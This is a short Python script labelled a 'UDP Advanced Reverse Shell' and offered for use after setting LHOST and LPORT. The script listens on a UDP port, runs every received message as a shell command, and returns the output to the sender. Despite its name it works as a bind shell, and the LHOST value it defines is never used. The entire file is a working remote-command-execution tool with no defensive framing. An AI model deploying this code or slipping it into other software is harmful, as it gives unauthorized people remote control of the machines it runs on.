#!/usr/bin/env python
# Python UDP Advanced Reverse Shell
# Configure LHOST and LPORT before use

import socket
import subprocess
import os

LHOST = '192.168.1.100'
LPORT = 4462

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(('', LPORT))

while True:
    data, addr = s.recvfrom(1024)
    if data.strip() == 'exit':
        break

    output = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    result = output.stdout.read() + output.stderr.read()
    s.sendto(result, addr)

s.close()
